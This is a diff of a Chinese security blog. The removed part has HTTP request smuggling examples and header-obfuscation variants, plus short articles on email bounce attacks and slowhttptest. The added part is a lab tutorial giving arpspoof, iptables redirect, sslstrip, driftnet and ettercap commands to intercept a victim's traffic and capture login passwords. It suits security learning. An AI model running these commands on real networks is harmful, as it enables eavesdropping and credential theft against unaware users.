-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>demo.com\r\n</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>44\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /secret HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>demo.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>注：\r\n表示 CRLF即换行</p>
-</blockquote>
-<blockquote>
-<p>前端服务器处理了Content-Length，而后端服务器没有处理 Content-Length ，基于pipeline机制认为这是两个独立的请求：<br>第一个请求：</p>
-</blockquote>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>demo.com\r\n</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>第二个请求：</p>
-</blockquote>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /secret HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>demo.com\r\n</span><br></pre></td></tr></table></figure>
-
-<h3><span id="cl-cl漏洞">CL-CL漏洞</span></h3><blockquote>
-<p>RFC7230规范：在RFC7230的第3.3.3节中的第四条中，规定当服务器收到的请求中包含两个Content-Length，而且两者的值不同时，需要返回400错误。<br>构造请求：</p>
-</blockquote>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>demo.com\r\n</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5\r\n</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>6\r\n</span><br><span class="line">\r\n</span><br><span class="line">12345\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>得到响应，返回400 Bad Request<br><img src="/2023/06/27/HTTP-request-smuggling-vulnerability/1.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>触发过程：但是总有服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误，但是中间代理服务器按照第一个Content-Length的值对请求进行处理，而后端源站服务器按照第二个Content-Length的值进行处理。</p>
-</blockquote>
-<h3><span id="cl-te漏洞">CL-TE漏洞</span></h3><blockquote>
-<p>CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理Content-Length请求头，而后端服务器会遵守RFC2616的规定，忽略掉Content-Length，处理Transfer-Encoding请求头。<br><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">CL.TE实验环境</a></p>
-</blockquote>
-<h3><span id="te-te漏洞">TE-TE漏洞</span></h3><blockquote>
-<p>在这里，前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理。<br>详见 RFC7230 section 3.3.3.3</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">If a Transfer-Encoding header field is present in a response and</span><br><span class="line">the chunked transfer coding is not the final encoding, the</span><br><span class="line">message body length is determined by reading the connection until</span><br><span class="line">it is closed by the server.  If a Transfer-Encoding header field</span><br><span class="line">is present in a request and the chunked transfer coding is not</span><br><span class="line">the final encoding, the message body length cannot be determined</span><br><span class="line">reliably; the server MUST respond with the 400 (Bad Request)</span><br><span class="line">status code and then close the connection.</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>这里列出七种混淆方式:</p>
-</blockquote>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">X</span><span class="punctuation">: </span>X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>之所以在处理这些请求头时会出现问题，是因为在实际的HTTP协议实现中，很少有代码精确的遵循了其中的规范，以此导致面对变形的请求头时会出现不同的处理方式。<br><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header">TE.CL实验环境</a></p>
-</blockquote>
-<h3><span id="te-cl漏洞">TE-CL漏洞</span></h3><blockquote>
-<p>所谓TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理Transfer-Encoding这一请求头，而后端服务器处理Content-Length请求头。<br><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">TE.CL验环境</a></p>
-</blockquote>
-<h2><span id="绕过前端服务器安全控制">绕过前端服务器安全控制</span></h2><h3><span id="利用cl-te漏洞绕过">利用CL-TE漏洞绕过</span></h3><blockquote>
-<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">CL.TE实验环境</a></p>
-</blockquote>
-<h3><span id="利用te-cl漏洞绕过">利用TE-CL漏洞绕过</span></h3><blockquote>
-<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">TE.CL实验环境</a></p>
-</blockquote>
-<h2><span id="漏洞防御">漏洞防御</span></h2><blockquote>
-<p>在前端服务器通过同一网络连接将多个请求转发到后端服务器的情况下，会出现HTTP请求走私漏洞，并且后端连接所使用的协议会带来两个服务器不同意边界的风险。要求。防止HTTP请求走私漏洞的一些通用方法如下：</p>
-<ul>
-<li>禁用后端连接的重用，以便每个后端请求通过单独的网络连接发送。</li>
-<li>使用HTTP &#x2F; 2进行后端连接，因为此协议可防止对请求之间的边界产生歧义。</li>
-<li>前端服务器和后端服务器使用完全相同的Web服务器软件，以便它们就请求之间的界限达成一致。<br>在某些情况下，可以通过使前端服务器规范歧义请求或使后端服务器拒绝歧义请求并关闭网络连接来避免漏洞。但是，这些方法比上面确定的通用缓解措施更容易出错。</li>
-</ul>
-</blockquote>
-<h2><span id="参考文章">参考文章</span></h2><blockquote>
-<p>(<a target="_blank" rel="noopener" href="https://paper.seebug.org/1048">https://paper.seebug.org/1048</a>)<br>(<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling">https://portswigger.net/web-security/request-smuggling</a>)<br>(<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting">https://portswigger.net/web-security/request-smuggling/exploiting</a>)</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/HTTP/" rel="tag">HTTP</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/06/27/Email-bounce-spoof-attack/">
-                电子邮件退信攻击
-            </a>
-        </h2>
-    
-    <time>
-        Jun 27, 2023
-    </time>
-    <section class="content">
-        <h1><span id="电子邮件退信攻击">电子邮件退信攻击</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="http://security.zhiding.cn/security_zone/2010/1225/1974371.shtml">zdnet</a> 并作补充</p>
-</blockquote>
-<h2><span id="杂记">杂记</span></h2><blockquote>
-<p>有生活常识的朋友都知道，当我们寄出一封信件的时候，如果收信人的地址变更或一些特殊原因。你所寄出的信件将会被原址退回。实际上电子邮件也是有这个退信功能的。不过这个便利的功能却被网络黑客发现并加以利用，邮件退信攻击有成为了危害邮件安全的一个难题。</p>
-<p>所谓邮件退信攻击，是将预攻击的对象伪造成发件人地址，而收件人设置为一系列其他邮件域并不存在的账号，这样当邮件大量发送，例如通过僵尸网络，由于收件人不存在，邮件系统将产生大量的退信给发件人地址。该发件人地址所属的真实服务器将收到大量的退信，增加服务器的负荷，也容易使该公司的邮件服务器被列入黑名单。</p>
-<p>邮件退信攻击在程度上有所区别，上面介绍的这种攻击，被攻击者可能一天之内收到数百上千封各种退信。一般用户碰到的邮件退信攻击属于骚扰性质，垃圾邮件发送者在发送垃圾邮件时，常常随机的设置发件人，例如其中包括<a href="mailto:&#98;&#x6f;&#98;&#x6f;&#x40;&#x61;&#x62;&#x63;&#46;&#x63;&#111;&#x6d;">&#98;&#x6f;&#98;&#x6f;&#x40;&#x61;&#x62;&#x63;&#46;&#x63;&#111;&#x6d;</a>，当大量发送垃圾邮件时，有些邮件可能是以<a href="mailto:&#98;&#111;&#98;&#111;&#x40;&#97;&#98;&#99;&#46;&#99;&#x6f;&#x6d;">&#98;&#111;&#98;&#111;&#x40;&#97;&#98;&#99;&#46;&#99;&#x6f;&#x6d;</a>发送的，则bobo就可能收到退信，有时一天只有几封或几十封，但总是不断，让人十分郁闷。</p>
-<p>退信信息通常比较有规律，例如发件人为空，或者为<a href="mailto:&#x4d;&#65;&#73;&#x4c;&#x45;&#82;&#45;&#x44;&#x41;&#x45;&#77;&#x4f;&#78;&#64;&#120;&#x78;&#x78;&#46;&#99;&#x6f;&#109;">&#x4d;&#65;&#73;&#x4c;&#x45;&#82;&#45;&#x44;&#x41;&#x45;&#77;&#x4f;&#78;&#64;&#120;&#x78;&#x78;&#46;&#99;&#x6f;&#109;</a>，主题一般为Undelivered Mail Returned等。有些用户采用关键字的技术将退信予以阻断，或者干脆限定阻止空发件人，但是这经常会把正常的退信也阻止掉，导致信息不畅。</p>
-<p>一般而言，退信占一个公司的邮件量5%以上，这其中绝大部分是垃圾退信。如何防止收到这种垃圾退信，避免邮件退信攻击呢?</p>
-<p>采用SPF或domain-key的技术。这两种技术的原理相似。例如sohu.com的SPF记录是sohu.com text &#x3D; “v&#x3D;spf1 ip4:61.135.130.0&#x2F;23 ip4:61.135.132.0&#x2F;23 (。。。sohu邮件服务器所属IP)all”;如果有人冒用sohu发送垃圾邮件，收件方如果采用了SPF过滤技术，就能判定这是假冒的垃圾邮件，将不会给sohu发送DNR了。</p>
-<p>遗憾的是很多服务器不做SPF验证，因此即使您的公司设置了SPF记录，也不能阻止垃圾退信。</p>
-</blockquote>
-<h2><span id="重点">重点</span></h2><blockquote>
-<p>此文其实是为了记念一下一个工具：<a target="_blank" rel="noopener" href="http://www.jetmore.org/john/code/swaks/">Swaks</a> </p>
-<p>几乎绝大部分的邮件攻击都可以由它进行实践，之前测试其实很多现在大厂的消费级邮箱是有或多或少的问题的。</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/25/Slowhttptest-Usage/">
-                Slowhttptest Usage
-            </a>
-        </h2>
-    
-    <time>
-        Aug 25, 2022
-    </time>
-    <section class="content">
-        <h1><span id="slowhttptest-对-slow-http-dos-的误判">Slowhttptest 对 Slow HTTP Dos 的误判</span></h1><h2><span id="当场滑跪">当场滑跪</span></h2><blockquote>
-<p>前段时间在巡检公司项目的时候发现了<a target="_blank" rel="noopener" href="https://szczecin.github.io/2022/08/08/Slow-HTTP-Dos/">HTTP慢速拒绝服务攻击（Slow HTTP Dos）</a><br>于是就下发让项目运维去修复了，但是反馈说明明配置了正确的参数，于是我当（zhi）场（jie）滑（dao）跪（qian） ORZ</p>
-<p><img src="/2022/08/25/Slowhttptest-Usage/1.jpg" alt="image"></p>
-</blockquote>
-<h2><span id="发生了什么">发生了什么</span></h2><blockquote>
-<p>所以是发生了什么？漏扫就那么垃圾和我过不去这么多误报？我还好好用 slowhttptest 去验证了，确实存在<code>service available:   NO</code>的显示，图就不发了，拿阿B的给你们看看：<br><img src="/2022/08/25/Slowhttptest-Usage/1.png" alt="image"></p>
-<p>后来看得多了我发现（其实早就发现了），slowhttptest 的<code>slowbody</code>模式下很容易出现<code>service available:   NO</code>，<code>read</code>和<code>header</code>就很容易通过测试<br>但是归根到底是否触发拒绝服务，肯定看：</p>
-<ul>
-<li><ol>
-<li>网站载入延时</li>
+<p>本文将介绍在局域网内，如何监听受害者流量并通过SSLstrip攻击获取敏感信息，分为如下两步：</p>
+<ol>
+<li>中间人攻击，监听受害者流量</li>
+<li>SSLStrip攻击，获取敏感信息</li>
 </ol>
-</li>
-<li><ol start="2">
-<li>网站是否还可访问</li>
+</blockquote>
+<h2><span id="实验环境">实验环境</span></h2><blockquote>
+<table>
+<thead>
+<tr>
+<th>IP地址</th>
+<th>MAC地址</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>win10</td>
+<td>192.168.40.1</td>
+<td>00:50:56:C0:00:08</td>
+</tr>
+<tr>
+<td>网关</td>
+<td>192.168.40.2</td>
+<td>00:50:56:E7:9F:31</td>
+</tr>
+<tr>
+<td>kali</td>
+<td>192.168.40.128</td>
+<td>00:0c:29:d8:d4:05</td>
+</tr>
+<tr>
+<td>win7</td>
+<td>192.168.40.130</td>
+<td>00:0C:29:C9:34:A6</td>
+</tr>
+<tr>
+<td>centos7</td>
+<td>192.168.40.132</td>
+<td>00:0c:29:bd:ef:65</td>
+</tr>
+</tbody></table>
+<p>kali：<a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/kali-images/kali-2020.1b/kali-linux-2020.1b-live-amd64.iso">kali-linux-2020.1b-live-amd64.iso</a></p>
+<p>win7：<a target="_blank" rel="noopener" href="http://d0.ananas.chaoxing.com/download/16169a8dcb8f0e07b98d19c870b10ce3?fn=WIN7lite(x64)">win7</a></p>
+<p>纯净虚拟机系统，使用VMware或者VirtualBox导入镜像即可。<br>采用Win7SP1镜像制作，极限精简，无多余组件，非常纯净，使用流畅，系统已激活。</p>
+</blockquote>
+<h2><span id="中间人攻击">中间人攻击</span></h2><blockquote>
+<p>中间人攻击（<a target="_blank" rel="noopener" href="http://man.linuxde.net/man">man</a>-in-the-Middle Attack, MITM)，就是攻击者扮演中间人进行攻击，可以劫持一段会话，窃取凭证和其他机密信息。简而言之，所谓的MITM攻击就是通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而通信的双方却毫不知情。</p>
+</blockquote>
+<h3><span id="arp-地址解析协议">ARP （地址解析协议）</span></h3><blockquote>
+<p>ARP 协议负责通过 IP 地址找到 MAC 地址（物理地址 ），在以太网中，是利用 MAC 地址来通讯的。</p>
+<p>ARP协议是这样工作的：如win10需要给win7（IP为192.168.40.130)发送数据，为了知道谁是win7，首先win10发送一个广播包给网内所有机器“谁是192.168.40.130”，正常情况其他机器忽略该消息，仅win7回复“我是192.168.40.130”，于是通信就可以开始。所有的主机维护他们自己的ARP缓存表，所以不会每一次都发送广播，ARP表中包含IP对应的MAC地址。</p>
+</blockquote>
+<h4><span id="如何进行arp欺骗">如何进行ARP欺骗?</span></h4><blockquote>
+<p>例如kali需要对win7进行arp欺骗，那他就不再忽略win10发送的消息，他也会大量的发送数据包回复“啊啊啊！我才是192.168.40.130”，然后win10就会错误地建立或者更新了自己ARP表。然后win10发送数据时都发到kali那去了。</p>
+</blockquote>
+<h2><span id="攻击准备">攻击准备</span></h2><h4><span id="mac-下准备">mac 下准备</span></h4><blockquote>
+<ol>
+<li>安装 macports <a target="_blank" rel="noopener" href="https://link.jianshu.com/?t=https://www.macports.org/install.php">官网</a></li>
+<li>更新 macports <code>sudo port -d selfupdate</code></li>
+<li>安装 dsniff（包含 arp 攻击的工具）<code>sudo port install dsniff</code></li>
+<li>安装 nmap <code>brew install nmap</code> (如果没有安装 Homebrew，可以去 <a target="_blank" rel="noopener" href="https://link.jianshu.com/?t=http://brew.sh/">Homebrew 官网</a></li>
 </ol>
-</li>
-</ul>
-<p>在看了<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41901122/article/details/114143913">星球守护者</a> 的漏洞复现后我发现，用 slowhttptest 验证 Slow HTTP Dos 真实存在，需要注意：</p>
 </blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. slow HTTP test status on Xth second:		X 数字较小，即较早就开始拒绝服务</span><br><span class="line">2. service available:   NO</span><br><span class="line">3. Test ended on X+1th second</span><br><span class="line">4. Exit status: Connection refused		这两点比较重要，真的拒绝服务了直接下一秒就停止测试了</span><br></pre></td></tr></table></figure>
+<h4><span id="linux-下准备">linux 下准备</span></h4><blockquote>
+<ol>
+<li>安装 dsniff <code>apt-get install -y dsniff</code></li>
+<li>安装 nmap <code>apt-get install -y nmap</code></li>
+</ol>
+</blockquote>
+<h2><span id="攻击步骤">攻击步骤</span></h2><h3><span id="寻找目标">寻找目标</span></h3><blockquote>
+<p>使用nmap命令扫描局域网，获得主机列表<br>如果所在局域网路由器地址是 192.168.40.1,可以使用 <code>nmap -sP 192.168.40.1/24</code> 扫描</p>
+<p>-sP 表示使用 ping 方式扫描，192.168.40.1&#x2F;24”表示扫描”192.168.40.1-192.168.40.254”这个网段的所有机器。</p>
+</blockquote>
+<h3><span id="开启-ip-转发">开启 IP 转发</span></h3><blockquote>
+<p>ARP欺骗一般目的是把自己伪装成网关，但如果不作处理，当被欺骗数据包到达后就会被本机丢弃（因为本机不是网关，不知道如何处理这类数据包），这会导致没有数据包返回给被欺骗主机，导致断网。这当然是不允许的。开启IP转发功能可以解决该问题。IP转发负责把该类数据包再转发给真正的网关处理，开启IP转发的方法。</p>
+<p>mac 下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.inet.ip.forwarding=1</span><br></pre></td></tr></table></figure>
 
-<blockquote>
-<p><img src="/2022/08/25/Slowhttptest-Usage/2.png" alt="image"></p>
+
+
+<p>linux 下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
 </blockquote>
-<h2><span id="不得不说">不得不说</span></h2><blockquote>
-<p>其实 Dos 类的漏洞你很不好说，因为访问量过大必然服务器承受不住，这个只能做缓解（流量分析、请求时限、扩容等等）<br>所以漏扫出来是否存在这个漏洞或者 slowhttptest 的<code>service available:   NO</code>，有可能是看片面了（某些请求在开始或者后来被识别后被拒绝、中断，或者网页响应时间是否有某个范围内的增量变化等，尤其是这个增量变化，我曾经发现因为一个资产页面正常请求的数量会变化，时延直接从几百ms级变成几s级的）</p>
-<p>好吧，okk</p>
-<p><img src="/2022/08/25/Slowhttptest-Usage/2.jpg" alt="image"></p>
+<h3><span id="arp-欺骗">ARP 欺骗</span></h3><blockquote>
+<p>假设被攻击的 IP 是 192.168.40.130，局域网的网关是 192.168.40.2，攻击电脑使用的网卡接口是 eth0(可以使用 <code>ifconfig</code> 命令查看）, 则欺骗命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.40.130 192.168.40.2</span><br><span class="line"><span class="comment">#arpspoof是dsniff的一个组件，主要用于进行arp欺骗使用</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>成功的的话在被攻击主机上arp表如图所示</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/1.png" alt="image"></p>
+</blockquote>
+<h3><span id="分析数据">分析数据</span></h3><blockquote>
+<p>如果 ARP 欺骗成功，则被攻击的设备会把所有数据先传到我们电脑上，接下来可以使用 ettercap 软件来分析数据。</p>
+</blockquote>
+<h2><span id="使用driftnet获取图片">使用driftnet获取图片</span></h2><blockquote>
+<p>安装driftnet<code>apt-get install driftnet</code></p>
+<p>开始获取<code>driftnet -i eth0</code></p>
+<p>找一个http的网站进行测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:“http” -https</span><br></pre></td></tr></table></figure>
+
+<p>例子：<code>http://www.kan-tv.com/</code></p>
+<p>Tips:https因为进行了加密不能直接获取，进行SSLStrip攻击后就可获取了</p>
+</blockquote>
+<h2><span id="sslstrip-攻击">SSLStrip 攻击</span></h2><blockquote>
+<p>2009年的黑帽大会上，一个名叫Moxie Marlinspike的研究人员,发布了一个叫sslstrip的工具。通过该工具，可以实现对ssl进行中间人攻击。</p>
+<p>SSLstrip 也叫 https 降级攻击，攻击者拦截用户流量后，欺骗用户与攻击者进行 http 通信，攻击者与服务器保持正常通信 （http 或 https），从而获取用户信息。</p>
+</blockquote>
+<h3><span id="攻击原理">攻击原理</span></h3><blockquote>
+<p>攻击者利用用户对于地址栏中HTTPS与HTTP的疏忽，将所有的HTTPS连接都用HTTP来代替。同时，与目标服务器建立正常的HTTPS连接。由于HTTP通信是没有经过加密传输的，并没有HTTPS安全，所以攻击者能轻松实施嗅探。</p>
+<ol>
+<li>通过中间人攻击监听 http 流量</li>
+<li>更改重定向链接中的 location，替换 https 为 http，并记录</li>
+<li>更改响应内容中的超链接，替换 https 为 http，并记录</li>
+<li>与用户进行 http 通信，与服务器进行 https 通信（记录中本应是 https 的请求），从而明文获取用户信息</li>
+</ol>
+<p>Tips:</p>
+<p>当用户浏览的网页中包含https协议，会被转化为http协议的请求</p>
+<p>但是sslstrip也不是万能的， 假如网页中没有https， 但是js代码绑定了跳转到https的协议请求的事件，那么sslstrip就失效了</p>
+</blockquote>
+<h3><span id="攻击准备">攻击准备</span></h3><blockquote>
+<ol>
+<li><p>监听 http 流量</p>
+</li>
+<li><p>获取 <a target="_blank" rel="noopener" href="https://moxie.org/software/sslstrip/">sslstrip工具</a></p>
+<p>Requirements</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Python &gt;= 2.5 (apt-get install python)</span><br><span class="line">The python <span class="string">&quot;twisted-web&quot;</span> module (apt-get install python-twisted-web)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get -y install python python-twisted-web</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/moxie0/sslstrip.git</span><br><span class="line"><span class="built_in">cd</span> sslstrip &amp;&amp; python ./setup.py install</span><br></pre></td></tr></table></figure></li>
+</ol>
+</blockquote>
+<h3><span id="攻击步骤">攻击步骤</span></h3><h4><span id="开启内核转发功能保证攻击过程中被攻击者不断网">开启内核转发功能保证攻击过程中被攻击者不断网</span></h4><blockquote>
+<p>临时ip转发</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
+
+<p>永久ip转发</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/sysctl.conf</span><br><span class="line">net.ipv4.ip_forward = 1        //修改值</span><br><span class="line">sysctl -p /etc/sysctl.conf    //使修改生效</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4><span id="把流量导入到-sslstrip-程序">把流量导入到 sslstrip 程序</span></h4><blockquote>
+<p>设置iptables以将HTTP通信重定向到sslstrip。<br>输入命令： <code>iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000</code><br>其中最后面的端口号（比如上面的 10000）就是 sslstrip 程序监听的端口号</p>
+<p>如果攻击完成后要删除这条记录可以输入命令 <code>iptables -t nat -D PREROUTING 1</code></p>
+<p>查看 ip 转发表： <code>iptables -t nat -L</code></p>
+</blockquote>
+<h4><span id="运行arpspoof以说服网络他们应该将流量发送给你">运行arpspoof以说服网络他们应该将流量发送给你</span></h4><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.40.130 192.168.40.2</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4><span id="启动sslstrip">启动sslstrip</span></h4><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sslstrip -l 10000</span><br><span class="line"></span><br><span class="line">-w &lt;文件名&gt;，–write = &lt;文件名&gt;指定要登录的文件（可选）。</span><br><span class="line">-p，–post仅记录SSL POST。（默认）</span><br><span class="line">-s，–ssl记录往返服务器的所有SSL流量。</span><br><span class="line">-a，–all记录往返服务器的所有SSL和HTTP通信。</span><br><span class="line">-l &lt;端口&gt;，–listen = &lt;端口&gt;用于侦听的端口（默认为10000）。</span><br><span class="line">-f，–favicon根据安全请求替换锁图标。</span><br><span class="line">-k，–killsessions终止正在进行的会话。</span><br><span class="line">-h 打印此帮助消息。</span><br><span class="line"></span><br><span class="line">查看端口占用lsof -i tcp:10000</span><br><span class="line"></span><br><span class="line">sslstrip -a -k -f -l 10000</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/ARP-SSLStrip/2.png" alt="image"></p>
+<p>可以看到，网页上没有任何不安全的警告或是提示，只是原先的HTTPS连接已经被HTTP连接所替换，并且为增加迷惑性，网页的图标被修改成了一个银色的锁图案。但是，假的毕竟是假的，一方面无法查看到任何证书的信息，另外如果在网址前输入https:&#x2F;&#x2F;，则网页无法发开。因此，sslstrip并不是万能的攻击方法。</p>
+</blockquote>
+<h3><span id="使用ettercap对目标主机进行arp攻击并且开始嗅探密码">使用ettercap对目标主机进行arp攻击，并且开始嗅探密码</span></h3><blockquote>
+<p>终端界面嗅探密码<code>ettercap -Tq -i eth0</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-P  使用插件</span><br><span class="line">-T  使用基于文本界面</span><br><span class="line">-q  启动安静模式（不回显）</span><br><span class="line">-M  启动ARP欺骗攻击</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们使用ettercap的GTK+ GUI图像界面<code>ettercap -G</code></p>
+<p><img src="/2023/12/06/ARP-SSLStrip/3.png" alt="image"></p>
+<p>选择Sniff—-Unified-sniffing，然后选择网卡：eth0(我这里是eth0，大家根据情况选择)。</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/4.png" alt="image"></p>
+<p>然后Hosts——Scan for hosts——Hosts list</p>
+<p>我们的目标主机ip(192.168.40.130)选定目标主机，然后点add to target 1，将目标主机添加到目标；选定路由，点add to target 2，将路由添加到目标2</p>
+<p>添加成功后，点击Mitm——ARP posoning ，勾选sniff remote connections。</p>
+<p>之后start——start sniffing开始监听。</p>
+<p>点击view——connections查看被攻击机访问的IP，端口，协议，发送和接收的数据包大小。</p>
+<p>点击view——profiles查看被攻击机访问的链接。在下方可以查看更清晰的链接访问情况。</p>
+<p>当然你也可以通过双击链接来查看profiles details，即访问网站的具体情况。</p>
+<p>在这里，如果被攻击机输入密码登陆某一网站，我们可以检测到登陆的用户名及其密码。</p>
+<p>这是刚刚检测到的一个用户名和登陆密码。这个网站完全没有对密码进行加密操作，出来的结果也是明文显示的。</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/5.png" alt="image"></p>
+<p>这是另外一个站检测出来的，对密码进行了加密。</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/6.png" alt="image"></p>
+<p>Tips：其实一个网站如果使用的都是https协议，那么安全性一般做的比较好，数据进行了加密的，也就是说你即使已经把https降低为http，即使捕获到了密码，你也不可能轻易解密的出来。</p>
+</blockquote>
+<h4><span id="测试网址">测试网址</span></h4><blockquote>
